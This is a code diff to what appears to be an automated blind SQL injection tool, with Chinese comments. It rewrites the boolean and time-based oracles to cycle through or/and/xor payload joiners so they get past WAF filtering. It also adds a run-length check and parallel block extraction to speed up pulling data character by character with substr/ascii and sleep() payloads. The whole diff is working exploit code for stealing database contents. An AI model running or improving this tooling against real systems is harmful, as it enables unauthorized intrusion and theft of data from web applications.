@@ -128,26 +128,36 @@ class BoolOracle(BaseOracle):
     def __init__(self, *a, workers: int = 6, **kw):
         super().__init__(*a, **kw)
         self.workers = workers
-        # or 参照优先：登录框恒真=成功页、查询框恒真=多行页，通吃两种语义
-        self.R_true = self.s.request_value(self.b.wrap(self.b.logic_or("1=1")))
-        self.R_false = self.s.request_value(self.b.wrap(self.b.logic_or("1=2")))
-        self._joiner = "or"
-        if similarity(self.R_true, self.R_false) > 0.995:
-            # or 无差异（被过滤或恒真恒假同页）→ and 参照
-            self.R_true = self.s.request_value(self.b.wrap(self.b.logic_and("1=1")))
-            self.R_false = self.s.request_value(self.b.wrap(self.b.logic_and("1=2")))
-            self._joiner = "and"
-            if similarity(self.R_true, self.R_false) > 0.995:
-                raise OracleError("真假页面无差异，布尔通道不可用")
+        # 参照 joiner 依次尝试：or（登录框恒真/查询框多行）→ and（查询框真=基线）
+        # → xor（FinalSQL 类：and/or/空格/注释全被滤，1^(cond) 真→0 假→基线）
+        for joiner in ("or", "and", "xor"):
+            fn = getattr(self.b, f"logic_{joiner}")
+            r_true = self.s.request_value(self.b.wrap(fn("1=1")))
+            r_false = self.s.request_value(self.b.wrap(fn("1=2")))
+            if similarity(r_true, r_false) > 0.995:
+                continue
+            self.R_true, self.R_false = r_true, r_false
+            self._joiner = joiner
+            self.s.log("INFO", f"[bool] joiner={joiner}")
+            return
+        raise OracleError("or/and/xor 均无真假差异，布尔通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
-        join = self.b.logic_or if self._joiner == "or" else self.b.logic_and
+        join = getattr(self.b, f"logic_{self._joiner}")
         payload = self.b.wrap(join(cond))
         r = self.s.request_value(payload)
         self.requests += 1
         if r.status_code < 0:
             raise OracleError("请求失败")
-        return similarity(r, self.R_true) >= similarity(r, self.R_false)
+        sim_t = similarity(r, self.R_true)
+        sim_f = similarity(r, self.R_false)
+        if max(sim_t, sim_f) < 0.90:
+            # 响应与双参照均不匹配：payload 疑似被 WAF 拦截/页面结构变化，
+            # 宁可早失败也不产出静默垃圾（曾把拦截页误判为恒真导致整串 '~'）
+            raise OracleError(f"响应与真假参照均不匹配（疑似被拦截）: "
+                              f"sim_t={sim_t:.2f} sim_f={sim_f:.2f} "
+                              f"payload[:80]={payload[:80]}")
+        return sim_t >= sim_f
 
     def _binsearch(self, cond_fmt, lo: int, hi: int) -> int:
         """cond_fmt(mid) 单调递减（true→false），返回最后为真的 mid（即真实值）。"""
@@ -161,10 +171,27 @@ class BoolOracle(BaseOracle):
                 hi = mid - 1
         return lo
 
-    def _char_at(self, expr: str, pos: int) -> str:
+    def _char_at(self, expr: str, pos: int, prev: str | None = None) -> str:
+        """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。"""
+        if prev:
+            eq = "=" if not self.waf.is_filtered("=") else " like "
+            if self.eval_bool(f"substr(({expr}),{pos},1){eq}substr(({expr}),{pos-1},1)"):
+                return prev
         code = self._binsearch(
             lambda m: f"ascii(substr(({expr}),{pos},1))>={m}", 32, 126)
         return chr(code)
+
+    def _extract_block(self, expr: str, start: int, end: int) -> str:
+        """块内串行（游程复用前一位），块间并发。"""
+        out = []
+        prev = None
+        for pos in range(start, end + 1):
+            if self.s.stopped:
+                raise OracleError("用户中止")
+            ch = self._char_at(expr, pos, prev)
+            out.append(ch)
+            prev = ch or None
+        return "".join(out)
 
     def scalar(self, expr: str) -> str:
         if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
@@ -172,12 +199,16 @@ class BoolOracle(BaseOracle):
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
         length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 1024)
-        self.s.log("INFO", f"[bool] 长度={length}，开始逐字符提取: {expr[:60]}")
+        self.s.log("INFO", f"[bool] 长度={length}，分块并发提取: {expr[:60]}")
         result = [""] * length
+        BLOCK = 16
+        blocks = [(i + 1, min(i + BLOCK, length)) for i in range(0, length, BLOCK)]
         with ThreadPoolExecutor(max_workers=self.workers) as ex:
-            futs = {ex.submit(self._char_at, expr, p + 1): p for p in range(length)}
+            futs = {ex.submit(self._extract_block, expr, a, b): (a, b)
+                    for a, b in blocks}
             for f in as_completed(futs):
-                result[futs[f]] = f.result()
+                a, b = futs[f]
+                result[a - 1:b] = f.result()
         return "".join(result)
 
 
@@ -281,17 +312,18 @@ class TimeOracle(BaseOracle):
         self.delay = delay
         if self.waf.is_filtered("sleep"):
             raise OracleError("sleep 被过滤，时间通道不可用")
-        # joiner 自适应：or 恒真（登录框 and 会因密码恒假短路导致 sleep 不执行）
-        self._joiner = "or"
-        r = self.s.request_value(self.b.wrap(self.b.logic_or(f"sleep({delay})")))
-        if r.elapsed_ms < self.delay * 1000 * 0.75:
-            self._joiner = "and"
-            r = self.s.request_value(self.b.wrap(self.b.logic_and(f"sleep({delay})")))
-            if r.elapsed_ms < self.delay * 1000 * 0.75 and not self.waf.is_filtered("if"):
-                raise OracleError("or/and 均无法触发延时，时间通道不可用")
+        # joiner 自适应：or 恒真（登录框 and 会因密码恒假短路）→ and → xor
+        for joiner in ("or", "and", "xor"):
+            self._joiner = joiner
+            fn = getattr(self.b, f"logic_{joiner}")
+            r = self.s.request_value(self.b.wrap(fn(f"sleep({delay})")))
+            if r.elapsed_ms >= self.delay * 1000 * 0.75:
+                return
+        if not self.waf.is_filtered("if"):
+            raise OracleError("or/and/xor 均无法触发延时，时间通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
-        join = self.b.logic_or if self._joiner == "or" else self.b.logic_and
+        join = getattr(self.b, f"logic_{self._joiner}")
         if not self.waf.is_filtered("if"):
             core = join(f"if(({cond}),sleep({self.delay}),0)")
         else:
@@ -320,11 +352,19 @@ class TimeOracle(BaseOracle):
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
         length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 512)
-        self.s.log("INFO", f"[time] 长度={length}，逐字符提取（每字符约 7 次请求）: {expr[:60]}")
+        self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
         out = []
+        prev = None
         for p in range(1, length + 1):
-            code = self._binsearch(lambda m: f"ascii(substr(({expr}),{p},1))>={m}", 32, 126)
-            out.append(chr(code))
             if self.s.stopped:
                 raise OracleError("用户中止")
+            if prev:
+                eq = "=" if not self.waf.is_filtered("=") else " like "
+                if self.eval_bool(f"substr(({expr}),{p},1){eq}substr(({expr}),{p-1},1)"):
+                    out.append(prev)
+                    continue
+            code = self._binsearch(lambda m: f"ascii(substr(({expr}),{p},1))>={m}", 32, 126)
+            ch = chr(code)
+            out.append(ch)
+            prev = ch or None
         return "".join(out)
